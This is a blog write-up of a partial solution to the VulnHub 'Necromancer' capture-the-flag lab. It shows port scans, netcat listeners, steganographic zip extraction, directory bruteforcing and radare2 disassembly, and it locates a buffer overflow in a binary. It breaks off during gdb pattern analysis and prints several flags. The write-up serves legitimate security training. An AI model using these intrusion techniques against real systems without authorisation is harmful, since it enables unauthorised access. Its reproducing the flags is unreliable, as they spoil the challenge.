---
layout: post
title: "Necromancer boot2root writeup"
description: "Necromancer boot2root writeup"
category: writeups
tags: [boot2root, vulnhub]
---
In this post I'll be documenting my partial solution to the [Necromancer](https://www.vulnhub.com/entry/the-necromancer-1,154/) boot2root created by [@xerubus](https://twitter.com/xerubus).

Inital recon of the system shows that only one UDP port is open.

```
 Currently scanning: Finished!   |   Screen View: Unique Hosts

 252 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 15120
 _____________________________________________________________________________
   IP            At MAC Address      Count  Len   MAC Vendor                   
 ----------------------------------------------------------------------------- 
---8<---
 192.168.56.101  08:00:27:8b:12:f4    250    15000   CADMUS COMPUTER SYSTEMS
---8<---
root@kali:~# unicornscan -mT -I 192.168.56.101:a;unicornscan -mU -I 192.168.56.101:a
Main [Error   chld.c:53] am i missing children?, oh well
UDP open 192.168.56.101:666  ttl 64
```

Let's see what's running on the port.

```
root@kali:~# nc -u 192.168.56.101 666
You gasp for air! Time is running out!
root@kali:~# echo testing | nc -u 192.168.56.102 666
You gasp for air! Time is running out!
```

Interesting, there is a service running on port 666 which is sending a message. An nmap scan was unable to fingerprint the service so it's likely custom.
I tried a couple of things to get the service responding differently but nothing worked. I ended up firing up  wireshark/tshark to see what's going on the network when I noticed something interesting.

```
====
root@kali:~# tshark -i eth0 -n
Capturing on 'eth0'
  0.596802 08:00:27:8b:12:f4 -> ff:ff:ff:ff:ff:ff ARP 60 Who has 192.168.56.2?  Tell 192.168.56.101
  0.598950 08:00:27:8b:12:f4 -> ff:ff:ff:ff:ff:ff ARP 60 Who has 192.168.56.3?  Tell 192.168.56.101
  0.601080 08:00:27:8b:12:f4 -> ff:ff:ff:ff:ff:ff ARP 60 Who has 192.168.56.4?  Tell 192.168.56.101
---8<---
  0.737304 08:00:27:8b:12:f4 -> ff:ff:ff:ff:ff:ff ARP 60 Who has 192.168.56.66?  Tell 192.168.56.101
  0.739564 192.168.56.101 -> 192.168.56.67 TCP 78 16663 > 4444 [SYN] Seq=0 Win=16384 Len=0 MSS=1460 SACK_PERM=1 WS=8 TSval=1778398900 TSecr=0
  0.741750 08:00:27:8b:12:f4 -> ff:ff:ff:ff:ff:ff ARP 60 Who has 192.168.56.68?  Tell 192.168.56.101
---8<---
  0.822960 08:00:27:8b:12:f4 -> ff:ff:ff:ff:ff:ff ARP 60 Who has 192.168.56.99?  Tell 192.168.56.101
  0.831145 192.168.56.101 -> 192.168.56.102 TCP 78 31712 > 4444 [SYN] Seq=0 Win=16384 Len=0 MSS=1460 SACK_PERM=1 WS=8 TSval=1537574917 TSecr=0
  0.831170 192.168.56.102 -> 192.168.56.101 TCP 54 4444 > 31712 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0
  0.833397 08:00:27:8b:12:f4 -> ff:ff:ff:ff:ff:ff ARP 60 Who has 192.168.56.103?  Tell 192.168.56.101
```

The necromancer machine was scanning the local subnet looking for machines which are alive, if it discovers a machine which is alive it attempts to connect on port 4444.
With no other lead at the time I started netcat on port 4444 and I was given a blob of text. I immediately recognised that the blob of text was a base64 encoded string and decoding reveals a message.

```
root@kali:~# nc -lvvp 4444
listening on [any] 4444 ...
192.168.56.101: inverse host lookup failed: Unknown server error : Connection timed out
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.101] 23199
...V2VsY29tZSENCg0KWW91IGZpbmQgeW91cnNlbGYgc3RhcmluZyB0b3dhcmRzIHRoZSBob3Jpem9uLCB3aXRoIG5vdGhpbmcgYnV0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxhbmQgb2Ygbm90aGluZ25lc3MuDQoNClR1cm5pbmcgdG8geW91ciBub3J0aCB5b3Ugbm90aWNlIGEgc21hbGwgZmxpY2tlciBvZiBsaWdodCBpbiB0aGUgZGlzdGFuY2UuDQpZb3Ugd2FsayBub3J0aCB0b3dhcmRzIHRoZSBmbGlja2VyIG9mIGxpZ2h0LCBvbmx5IHRvIGJlIHN0b3BwZWQgYnkgc29tZSB0eXBlIG9mIGludmlzaWJsZSBiYXJyaWVyLiAgDQoNClRoZSBhaXIgYXJvdW5kIHlvdSBiZWdpbnMgdG8gZ2V0IHRoaWNrZXIsIGFuZCB5b3VyIGhlYXJ0IGJlZ2lucyB0byBiZWF0IGFnYWluc3QgeW91ciBjaGVzdC4gDQpZb3UgdHVybiB0byB5b3VyIGxlZnQuLiB0aGVuIHRvIHlvdXIgcmlnaHQhICBZb3UgYXJlIHRyYXBwZWQhDQoNCllvdSBmdW1ibGUgdGhyb3VnaCB5b3VyIHBvY2tldHMuLiBub3RoaW5nISAgDQpZb3UgbG9vayBkb3duIGFuZCBzZWUgeW91IGFyZSBzdGFuZGluZyBpbiBzYW5kLiAgDQpEcm9wcGluZyB0byB5b3VyIGtuZWVzIHlvdSBiZWdpbiB0byBkaWcgZnJhbnRpY2FsbHkuDQoNCkFzIHlvdSBkaWcgeW91IG5vdGljZSB0aGUgYmFycmllciBleHRlbmRzIHVuZGVyZ3JvdW5kISAgDQpGcmFudGljYWxseSB5b3Uga2VlcCBkaWdnaW5nIGFuZCBkaWdnaW5nIHVudGlsIHlvdXIgbmFpbHMgc3VkZGVubHkgY2F0Y2ggb24gYW4gb2JqZWN0Lg0KDQpZb3UgZGlnIGZ1cnRoZXIgYW5kIGRpc2NvdmVyIGEgc21hbGwgd29vZGVuIGJveC4gIA0KZmxhZzF7ZTYwNzhiOWIxYWFjOTE1ZDExYjlmZDU5NzkxMDMwYmZ9IGlzIGVuZ3JhdmVkIG9uIHRoZSBsaWQuDQoNCllvdSBvcGVuIHRoZSBib3gsIGFuZCBmaW5kIGEgcGFyY2htZW50IHdpdGggdGhlIGZvbGxvd2luZyB3cml0dGVuIG9uIGl0LiAiQ2hhbnQgdGhlIHN0cmluZyBvZiBmbGFnMSAtIHU2NjYi...

 sent 0, rcvd 1424
root@kali:~# echo 'V2VsY29tZSENCg0KWW91IGZpbmQgeW91cnNlbGYgc3RhcmluZyB0b3dhcmRzIHRoZSBob3Jpem9uLCB3aXRoIG5vdGhpbmcgYnV0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxhbmQgb2Ygbm90aGluZ25lc3MuDQoNClR1cm5pbmcgdG8geW91ciBub3J0aCB5b3Ugbm90aWNlIGEgc21hbGwgZmxpY2tlciBvZiBsaWdodCBpbiB0aGUgZGlzdGFuY2UuDQpZb3Ugd2FsayBub3J0aCB0b3dhcmRzIHRoZSBmbGlja2VyIG9mIGxpZ2h0LCBvbmx5IHRvIGJlIHN0b3BwZWQgYnkgc29tZSB0eXBlIG9mIGludmlzaWJsZSBiYXJyaWVyLiAgDQoNClRoZSBhaXIgYXJvdW5kIHlvdSBiZWdpbnMgdG8gZ2V0IHRoaWNrZXIsIGFuZCB5b3VyIGhlYXJ0IGJlZ2lucyB0byBiZWF0IGFnYWluc3QgeW91ciBjaGVzdC4gDQpZb3UgdHVybiB0byB5b3VyIGxlZnQuLiB0aGVuIHRvIHlvdXIgcmlnaHQhICBZb3UgYXJlIHRyYXBwZWQhDQoNCllvdSBmdW1ibGUgdGhyb3VnaCB5b3VyIHBvY2tldHMuLiBub3RoaW5nISAgDQpZb3UgbG9vayBkb3duIGFuZCBzZWUgeW91IGFyZSBzdGFuZGluZyBpbiBzYW5kLiAgDQpEcm9wcGluZyB0byB5b3VyIGtuZWVzIHlvdSBiZWdpbiB0byBkaWcgZnJhbnRpY2FsbHkuDQoNCkFzIHlvdSBkaWcgeW91IG5vdGljZSB0aGUgYmFycmllciBleHRlbmRzIHVuZGVyZ3JvdW5kISAgDQpGcmFudGljYWxseSB5b3Uga2VlcCBkaWdnaW5nIGFuZCBkaWdnaW5nIHVudGlsIHlvdXIgbmFpbHMgc3VkZGVubHkgY2F0Y2ggb24gYW4gb2JqZWN0Lg0KDQpZb3UgZGlnIGZ1cnRoZXIgYW5kIGRpc2NvdmVyIGEgc21hbGwgd29vZGVuIGJveC4gIA0KZmxhZzF7ZTYwNzhiOWIxYWFjOTE1ZDExYjlmZDU5NzkxMDMwYmZ9IGlzIGVuZ3JhdmVkIG9uIHRoZSBsaWQuDQoNCllvdSBvcGVuIHRoZSBib3gsIGFuZCBmaW5kIGEgcGFyY2htZW50IHdpdGggdGhlIGZvbGxvd2luZyB3cml0dGVuIG9uIGl0LiAiQ2hhbnQgdGhlIHN0cmluZyBvZiBmbGFnMSAtIHU2NjYi' | base64 -d
Welcome!

You find yourself staring towards the horizon, with nothing but silence surrounding you.
You look east, then south, then west, all you can see is a great wasteland of nothingness.

Turning to your north you notice a small flicker of light in the distance.
You walk north towards the flicker of light, only to be stopped by some type of invisible barrier.  

The air around you begins to get thicker, and your heart begins to beat against your chest. 
You turn to your left.. then to your right!  You are trapped!

You fumble through your pockets.. nothing!  
You look down and see you are standing in sand.  
Dropping to your knees you begin to dig frantically.

As you dig you notice the barrier extends underground!  
Frantically you keep digging and digging until your nails suddenly catch on an object.

You dig further and discover a small wooden box.  
flag1{e6078b9b1aac915d11b9fd59791030bf} is engraved on the lid.

You open the box, and find a parchment with the following written on it. "Chant the string of flag1 - u666"
```

The first flag is **flag1{e6078b9b1aac915d11b9fd59791030bf}** and the message makes it clear that we need to send the flag to the service running on UDP 666.
Sending the string as is didn't do anything but sending the hex string we receive a message hinting that there is an encoding issue.
If you search the hex string online you see that it's md5 has of the string "opensesame".
Now if you send the string opensesame to the service running on UDP 666, the service responds with another message and a new service is exposed on port 80.
The second flag is **flag2{c39cd4df8f2e35d20d92c2e44de5f7c6}**.

```
root@kali:~# echo 'flag1{e6078b9b1aac915d11b9fd59791030bf}' |  nc -u 192.168.56.101 666
Chant is too long! You gasp for air!
root@kali:~# echo 'e6078b9b1aac915d11b9fd59791030bf' |  nc -u 192.168.56.101 666
Chant had no affect! Try in a different tongue!
root@kali:~# echo 'opensesame' |  nc -u 192.168.56.101 666


A loud crack of thunder sounds as you are knocked to your feet!

Dazed, you start to feel fresh air entering your lungs.

You are free!

In front of you written in the sand are the words:

flag2{c39cd4df8f2e35d20d92c2e44de5f7c6}

As you stand to your feet you notice that you can no longer see the flicker of light in the distance.

You turn frantically looking in all directions until suddenly, a murder of crows appear on the horizon.

As they get closer you can see one of the crows is grasping on to an object. As the sun hits the object, shards of light beam from its surface.

The birds get closer, and closer, and closer.

Staring up at the crows you can see they are in a formation.

Squinting your eyes from the light coming from the object, you can see the formation looks like the numeral 80.

As quickly as the birds appeared, they have left you once again.... alone... tortured by the deafening sound of silence.

666 is closed.
```

Running a port scan against the necromancer machine confirms that TCP port 80 is now open.

```
root@kali:~# unicornscan -mT -I 192.168.56.101:a;unicornscan -mU -I 192.168.56.101:a
TCP open 192.168.56.101:80  ttl 64
```

Nikto does not turn up anything interesting.

```
root@kali:~# nikto -h 192.168.56.101 -C all
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.101
+ Target Hostname:    test
+ Target Port:        80
+ Start Time:         2016-09-15 08:17:28 (GMT-4)
---------------------------------------------------------------------------
+ Server: OpenBSD httpd
+ The anti-clickjacking X-Frame-Options header is not present.
+ 22333 requests: 0 error(s) and 1 item(s) reported on remote host
+ End Time:           2016-09-15 08:19:03 (GMT-4) (95 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Browsing to the web server we see more text and a linked image.

<img src="{{site.url}}/assets/necromancer-1.png">

There is nothing interesting in the page source, in the pics directory nor the robots.txt.

```
root@kali:~# curl 192.168.56.101
<html>
  <head>
    <title>The Chasm</title>
  </head>
  <body bgcolor="#000000" link="green" vlink="green" alink="green">
    <font color="green">
    Hours have passed since you first started to follow the crows.<br><br>
    Silence continues to engulf you as you treck towards a mountain range on the horizon.<br><br>
    More times passes and you are now standing in front of a great chasm.<br><br>
    Across the chasm you can see a necromancer standing in the mouth of a cave, staring skyward at the circling crows.<br><br>
    As you step closer to the chasm, a rock dislodges from beneath your feet and falls into the dark depths.<br><br>
    The necromancer looks towards you with hollow eyes which can only be described as death.<br><br>
    He smirks in your direction, and suddenly a bright light momentarily blinds you.<br><br>
    The silence is broken by a blood curdling screech of a thousand birds, followed by the necromancers laughs fading as he decends into the cave!<br><br>
    The crows break their formation, some flying aimlessly in the air; others now motionless upon the ground.<br><br>
    The cave is now protected by a gaseous blue haze, and an organised pile of feathers lay before you.<br><br>
    <img src="/pics/pileoffeathers.jpg">
    <p><font size=2>Image copyright: <a href="http://www.featherfolio.com/" target=_blank>Chris Maynard</a></font></p>
    </font>
  </body>
</html>
root@kali:~# curl 192.168.56.101/pics
<!DOCTYPE html>
<html>
<head>
<title>301 Moved Permanently</title>
<style type="text/css"><!--
body { background-color: white; color: black; font-family: 'Comic Sans MS', 'Chalkboard SE', 'Comic Neue', sans-serif; }
hr { border: 0; border-bottom: 1px dashed; }

--></style>
</head>
<body>
<h1>301 Moved Permanently</h1>
<hr>
<address>OpenBSD httpd</address>
</body>
</html>
root@kali:~# curl 192.168.56.101/robots.txt
<!DOCTYPE html>
<html>
<head>
<title>404 Not Found</title>
<style type="text/css"><!--
body { background-color: white; color: black; font-family: 'Comic Sans MS', 'Chalkboard SE', 'Comic Neue', sans-serif; }
hr { border: 0; border-bottom: 1px dashed; }

--></style>
</head>
<body>
<h1>404 Not Found</h1>
<hr>
<address>OpenBSD httpd</address>
</body>
</html>
```

Running a directory bruteforce does not turn up anything interesting.

```
root@kali:~/dirsearch# ./dirsearch.py -u http://192.168.56.101/ -e htm,html,jpg

 _|. _ _  _  _  _ _|_    v0.3.7
(_||| _) (/_(_|| (_| )

Extensions: htm, html, jpg | Threads: 10 | Wordlist size: 5931

Error Log: /root/dirsearch/logs/errors-16-09-15_08-23-00.log

Target: http://192.168.56.101/

[08:23:00] Starting: 
[08:23:05] 200 -    1KB - /index.html
[08:23:05] 200 -    1KB - /index.html
[08:23:07] 301 -  374B  - /pics  ->  http://192.168.56.101/pics/

Task Completed
```

Running binwalk over the image does however turn up a hidden zip file appended to the end of the image

```
root@kali:~# curl -O http://192.168.56.101/pics/pileoffeathers.jpg
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 37289  100 37289    0     0  6589k      0 --:--:-- --:--:-- --:--:-- 7283k
root@kali:~# binwalk -e pileoffeathers.jpg 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, EXIF standard
12            0xC             TIFF image data, little-endian
36994         0x9082          Zip archive data, at least v2.0 to extract, compressed size: 121,  uncompressed size: 125, name: "feathers.txt"
37267         0x9193          End of Zip archive
```

Inside the zip file is a text file which contains a base64 encoded string. Decoding the string reveals the next flag which is **flag3{9ad3f62db7b91c28b68137000394639f}** and the next challenge.

```
root@kali:~# cat _pileoffeathers.jpg.extracted/feathers.txt 
ZmxhZzN7OWFkM2Y2MmRiN2I5MWMyOGI2ODEzNzAwMDM5NDYzOWZ9IC0gQ3Jvc3MgdGhlIGNoYXNtIGF0IC9hbWFnaWNicmlkZ2VhcHBlYXJzYXR0aGVjaGFzbQ==
root@kali:~# cat _pileoffeathers.jpg.extracted/feathers.txt | base64 -d
flag3{9ad3f62db7b91c28b68137000394639f} - Cross the chasm at /amagicbridgeappearsatthechasm
```

The next page is more text and an image.

<img src="{{site.url}}/assets/necromancer-2.png">

Viewing the page source does not return anything. There is nothing hidden in the images metadata nor inside the image.

```
root@kali:~# curl http://192.168.56.101/amagicbridgeappearsatthechasm/
<html>
  <head>
    <title>The Cave</title>
  </head>
  <body bgcolor="#000000" link="green" vlink="green" alink="green">
    <font color="green">
    You cautiously make your way across chasm.<br><br>
    You are standing on a snow covered plateau, surrounded by shear cliffs of ice and stone.<br><br>
    The cave before you is protected by some sort of spell cast by the necromancer.<br><br>
    You reach out to touch the gaseous blue haze, and can feel life being drawn from your soul the closer you get.<br><br>
    Hastily you take a few steps back away from the cave entrance.<br><br>
    There must be a magical item that could protect you from the necromancer's spell.<br><br>
    <img src="../pics/magicbook.jpg">
    </font>
  </body>
</html>
root@kali:~# curl -O http://192.168.56.101/pics/magicbook.jpg
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  154k  100  154k    0     0  23.3M      0 --:--:-- --:--:-- --:--:-- 30.1M
root@kali:~# exiftool magicbook.jpg 
ExifTool Version Number         : 8.60
File Name                       : magicbook.jpg
Directory                       : .
File Size                       : 154 kB
File Modification Date/Time     : 2016:05:09 07:53:24-04:00
File Permissions                : rw-r--r--
File Type                       : JPEG
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 600
Image Height                    : 450
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 600x450
root@kali:~# binwalk magicbook.jpg 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard  1.01
```

With no leads I started bruteforcing the new directory which turned up an executable named 'talisman'.

```
root@kali:~/dirsearch# ./dirsearch.py -u http://192.168.56.101/amagicbridgeappearsatthechasm/ -e htm,html,jpg -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 

 _|. _ _  _  _  _ _|_    v0.3.7
(_||| _) (/_(_|| (_| )

Extensions: htm, html, jpg | Threads: 10 | Wordlist size: 220547

Error Log: /root/dirsearch/logs/errors-16-09-15_08-31-26.log

Target: http://192.168.56.101/amagicbridgeappearsatthechasm/

[08:31:26] Starting: 
[08:31:26] 200 -  755B  - /amagicbridgeappearsatthechasm/
[08:33:22] 200 -    9KB - /amagicbridgeappearsatthechasm/talisman
[08:35:02] 200 -  755B  - /amagicbridgeappearsatthechasm/

Task Completed
root@kali:~# curl -O http://192.168.56.101/amagicbridgeappearsatthechasm/talisman
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  9676  100  9676    0     0  1771k      0 --:--:-- --:--:-- --:--:-- 2362k
root@kali:~# file talisman 
talisman: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=0xf91d132bdf7a0806ba8c3f16d2b367199d636e76, not stripped
```

Running strings on the binary didn't give any clue as to what it does besides printing something.

```
root@kali:~# strings talisman 
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
__isoc99_scanf
printf
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.0
PTRh
UWVS
t$,U
[^_]
;*2$"
```

Continuing with static analysis I fired up radare2 to analyse the binary. My findings have been added to the disassembly.

```
root@kali:~# radare2 talisman 
[0x08048350]> aaa
[0x08048350]> afl ; list all functions
0x08048310     16   0  imp.printf
0x08048000     16   0  imp.__gmon_start__
0x08048320     16   0  imp.__libc_start_main
0x08048330     16   0  imp.__isoc99_scanf
0x08048a13     36   1  sym.main
0x08048529   1258   1  sym.wearTalisman ; interesting looking function name
0x080484f4     53   1  sym.myPrintf ; custom print function
0x0804844b     82   4  sym.unhide ; something is being unhidden
0x08048499      4   1  loc.08048499
0x08048458     69   3  loc.08048458
0x0804849d     87   4  sym.hide ; something is being hidden
0x080484f0      4   1  loc.080484f0
0x080484aa     74   3  loc.080484aa
0x08048350     34   1  section..text
0x08048390     43   4  sym.deregister_tm_clones
0x080483b9      2   1  loc.080483b9
0x080483c0     53   4  sym.register_tm_clones
0x080483f3      2   1  loc.080483f3
0x08048400     30   3  sym.__do_global_dtors_aux
0x0804841c      2   1  loc.0804841c
0x08048420    125   8  sym.frame_dummy
0x08048430    109   7  loc.08048430
0x0804842b    114   5  loc.0804842b
0x08049590      2   1  sym.__libc_csu_fini
0x08048380      4   1  sym.__x86.get_pc_thunk.bx
0x08048a37   2795   1  sym.chantToBreakSpell ; another interesting looking function name
0x08049594     20   1  section..fini
0x08049530     93   4  sym.__libc_csu_init
0x080482d0     35   3  section..init
0x080482ee      5   1  loc.080482ee
0x08048340     50   1  section..plt.got
0x08049585      8   1  loc.08049585
0x08049568     37   2  loc.08049568
[0x08048350]> pdf @ sym.main ; disassemble the main function
/ function: sym.main (36)
|     0x08048a13  sym.main:
|     0x08048a13     8d4c2404         lea ecx, [esp+0x4]
|     0x08048a17     83e4f0           and esp, 0xfffffff0
|     0x08048a1a     ff71fc           push dword [ecx-0x4]
|     0x08048a1d     55               push ebp
|     0x08048a1e     89e5             mov ebp, esp
|     0x08048a20     51               push ecx
|     0x08048a21     83ec04           sub esp, 0x4
|     0x08048a24     e800fbffff       call dword sym.wearTalisman ; call the wearTalisman function
|        ; sym.wearTalisman()
|     0x08048a29     b800000000       mov eax, 0x0
|     0x08048a2e     83c404           add esp, 0x4
|     0x08048a31     59               pop ecx
|     0x08048a32     5d               pop ebp
|     0x08048a33     8d61fc           lea esp, [ecx-0x4]
\     0x08048a36     c3               ret
      ; ------------
[0x08048350]> pdf @ sym.wearTalisman
      ; CODE (CALL) XREF 0x08048a24 (sym.main)
/ function: sym.wearTalisman (1258)
|     0x08048529  sym.wearTalisman:
|     0x08048529     55               push ebp
|     0x0804852a     89e5             mov ebp, esp
|     0x0804852c     57               push edi
|     0x0804852d     81ecb4010000     sub esp, 0x1b4
|     0x08048533     8d9554feffff     lea edx, [ebp+0xfffffe54]
|     0x08048539     b800000000       mov eax, 0x0
|     0x0804853e     b964000000       mov ecx, 0x64
|     0x08048543     89d7             mov edi, edx
|     0x08048545     f3ab             rep stosd
|     0x08048547     c68554feffffec   mov byte [ebp+0xfffffe54], 0xec ; load the first blob into memory
|     0x0804854e     c68555feffff9d   mov byte [ebp+0xfffffe55], 0x9d
|     0x08048555     c68556feffff49   mov byte [ebp+0xfffffe56], 0x49
---8<---
|     0x08048937     c6853dffffffd2   mov byte [ebp+0xffffff3d], 0xd2
|     0x0804893e     c6853effffff1c   mov byte [ebp+0xffffff3e], 0x1c
|     0x08048945     c6853fffffffa1   mov byte [ebp+0xffffff3f], 0xa1
|     0x0804894c     c64580bf         mov byte [ebp-0x80], 0xbf ; load the second blob into memory
|     0x08048950     c64581bc         mov byte [ebp-0x7f], 0xbc
|     0x08048954     c6458253         mov byte [ebp-0x7e], 0x53
---8<---
|     0x08048998     c64593ab         mov byte [ebp-0x6d], 0xab
|     0x0804899c     c64594bf         mov byte [ebp-0x6c], 0xbf
|     0x080489a0     c64595f2         mov byte [ebp-0x6b], 0xf2
|     0x080489a4     83ec0c           sub esp, 0xc
|     0x080489a7     8d8554feffff     lea eax, [ebp+0xfffffe54]
|     0x080489ad     50               push eax
|     0x080489ae     e841fbffff       call dword sym.myPrintf ; call it's custom print function
|        ; sym.myPrintf(unk)
|     0x080489b3     83c410           add esp, 0x10
|     0x080489b6     83ec0c           sub esp, 0xc
|     0x080489b9     8d8554feffff     lea eax, [ebp+0xfffffe54]
|     0x080489bf     83c064           add eax, 0x64
|     0x080489c2     50               push eax
|     0x080489c3     e82cfbffff       call dword sym.myPrintf ; call the print function again
|        ; sym.myPrintf(unk)
|     0x080489c8     83c410           add esp, 0x10
|     0x080489cb     83ec0c           sub esp, 0xc
|     0x080489ce     8d8554feffff     lea eax, [ebp+0xfffffe54]
|     0x080489d4     05c8000000       add eax, 0xc8
|     0x080489d9     50               push eax
|     0x080489da     e815fbffff       call dword sym.myPrintf ; call the print function again
|        ; sym.myPrintf(unk)
|     0x080489df     83c410           add esp, 0x10
|     0x080489e2     83ec08           sub esp, 0x8
|     0x080489e5     8d45e4           lea eax, [ebp-0x1c]
|     0x080489e8     50               push eax
|     0x080489e9     68b0950408       push dword 0x80495b0
|     0x080489ee     e83df9ffff       call dword imp.__isoc99_scanf ; get input from the user
|        ; imp.__isoc99_scanf()
|     0x080489f3     83c410           add esp, 0x10
|     0x080489f6     83ec0c           sub esp, 0xc
|     0x080489f9     8d8554feffff     lea eax, [ebp+0xfffffe54]
|     0x080489ff     052c010000       add eax, 0x12c
|     0x08048a04     50               push eax
|     0x08048a05     e8eafaffff       call dword sym.myPrintf ; call the print function again
|        ; sym.myPrintf(unk)
|     0x08048a0a     83c410           add esp, 0x10
|     0x08048a0d     90               nop
|     0x08048a0e     8b7dfc           mov edi, [ebp-0x4]
|     0x08048a11     c9               leave
\     0x08048a12     c3               ret
      ; ------------
[0x08048350]> pdf @ sym.myPrintf ; disassemble the custom print function
       ; CODE (CALL) XREF 0x080489ae (sym.wearTalisman)
       ; CODE (CALL) XREF 0x080489c3 (sym.wearTalisman)
       ; CODE (CALL) XREF 0x080489da (sym.wearTalisman)
       ; CODE (CALL) XREF 0x08048a05 (sym.wearTalisman)
       ; CODE (CALL) XREF 0x0804947a (sym.chantToBreakSpell)
       ; CODE (CALL) XREF 0x0804948f (sym.chantToBreakSpell)
       ; CODE (CALL) XREF 0x080494a6 (sym.chantToBreakSpell)
       ; CODE (CALL) XREF 0x080494bd (sym.chantToBreakSpell)
       ; CODE (CALL) XREF 0x080494d4 (sym.chantToBreakSpell)
       ; CODE (CALL) XREF 0x080494eb (sym.chantToBreakSpell)
       ; CODE (CALL) XREF 0x08049502 (sym.chantToBreakSpell)
       ; CODE (CALL) XREF 0x08049514 (sym.chantToBreakSpell)
/ function: sym.myPrintf (53)
|      0x080484f4  sym.myPrintf:
|      0x080484f4     55               push ebp
|      0x080484f5     89e5             mov ebp, esp
|      0x080484f7     83ec08           sub esp, 0x8
|      0x080484fa     ff7508           push dword [ebp+0x8]
|      0x080484fd     e849ffffff       call dword sym.unhide
|         ; sym.unhide(unk) ; the binary has a unhide function which will probably decode the loaded blobs
|      0x08048502     83c404           add esp, 0x4
|      0x08048505     83ec08           sub esp, 0x8
|      0x08048508     ff7508           push dword [ebp+0x8]
|      0x0804850b     68b0950408       push dword 0x80495b0
|      0x08048510     e8fbfdffff       call dword imp.printf
|         ; imp.printf() ; print the decoded string
|      0x08048515     83c410           add esp, 0x10
|      0x08048518     83ec0c           sub esp, 0xc
|      0x0804851b     ff7508           push dword [ebp+0x8]
|      0x0804851e     e87affffff       call dword sym.hide
|         ; sym.hide(unk) ; rehide the decoded blob
|      0x08048523     83c410           add esp, 0x10
|      0x08048526     90               nop
|      0x08048527     c9               leave
\      0x08048528     c3               ret
       ; ------------
[0x08048350]> pdf @ sym.unhide ; disassemble the unhide function
       ; CODE (CALL) XREF 0x080484fd (sym.myPrintf)
/ function: sym.unhide (82)
|      0x0804844b  sym.unhide:
|      0x0804844b     55               push ebp
|      0x0804844c     89e5             mov ebp, esp
|      0x0804844e     83ec10           sub esp, 0x10
|      0x08048451     c745fc00000000   mov dword [ebp-0x4], 0x0
|      ; CODE (JMP) XREF 0x08048497 (sym.unhide)
/ loc: loc.08048458 (69)
|      0x08048458  loc.08048458:
|      0x08048458     8b45fc           mov eax, [ebp-0x4]
|      0x0804845b     99               cdq
|      0x0804845c     c1ea1e           shr edx, 0x1e
|      0x0804845f     01d0             add eax, edx
|      0x08048461     83e003           and eax, 0x3
|      0x08048464     29d0             sub eax, edx
|      0x08048466     c1e003           shl eax, 0x3
|      0x08048469     bab5f23ca1       mov edx, 0xa13cf2b5
|      0x0804846e     89c1             mov ecx, eax
|      0x08048470     d3ea             shr edx, cl
|      0x08048472     89d0             mov eax, edx
|      0x08048474     89c2             mov edx, eax
|      0x08048476     8b4508           mov eax, [ebp+0x8]
|      0x08048479     0fb600           movzx eax, byte [eax]
|      0x0804847c     31d0             xor eax, edx
|      0x0804847e     89c2             mov edx, eax
|      0x08048480     8b4508           mov eax, [ebp+0x8]
|      0x08048483     8810             mov [eax], dl
|      0x08048485     8345fc01         add dword [ebp-0x4], 0x1
|      0x08048489     8b4508           mov eax, [ebp+0x8]
|      0x0804848c     0fb600           movzx eax, byte [eax]
|      0x0804848f     84c0             test al, al
|  ,=< 0x08048491     7406             jz loc.08048499
|  |   0x08048493     83450801         add dword [ebp+0x8], 0x1
|  |   0x08048497     ebbf             jmp loc.08048458
|  |   ; CODE (JMP) XREF 0x08048491 (sym.unhide)
/ loc: loc.08048499 (4)
|  |   0x08048499  loc.08048499:
|  `-> 0x08048499     90               nop
|      0x0804849a     90               nop
|      0x0804849b     c9               leave
\      0x0804849c     c3               ret
       ; ------------
```

Let's run the binary to see if our findings are correct and if we can break the program.

```
root@kali:~# ./talisman 
You have found a talisman.

The talisman is cold to the touch, and has no words or symbols on it's surface.

Do you want to wear the talisman?  a

Nothing happens.
root@kali:~# ./talisman 
You have found a talisman.

The talisman is cold to the touch, and has no words or symbols on it's surface.

Do you want to wear the talisman?  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Nothing happens.
Segmentation fault
root@kali:~# dmesg 
[15944.942943] talisman[9493]: segfault at 41414141 ip 41414141 sp bfd1d930 error 14
```

Our analysis was correct and we've found a buffer overflow. We've got to exploit the buffer overflow to execute the function named chantToBreakSpell. Let's breakout gdb and find out what registers we control and build an exploit.

```
root@kali:~# gdb -q talisman 
Reading symbols from /root/talisman...(no debugging symbols found)...done.
gdb-peda$ pattern_create 100 input
Writing pattern of 100 chars to filename "input"
gdb-peda$ r < input 
warning: no loadable sections found in added symbol-file system-supplied DSO at 0xb7fe0000
You have found a talisman.

The talisman is cold to the touch, and has no words or symbols on it's surface.

Do you want to wear the talisman?  
Nothing happens.
Program received signal SIGSEGV, Segmentation fault.
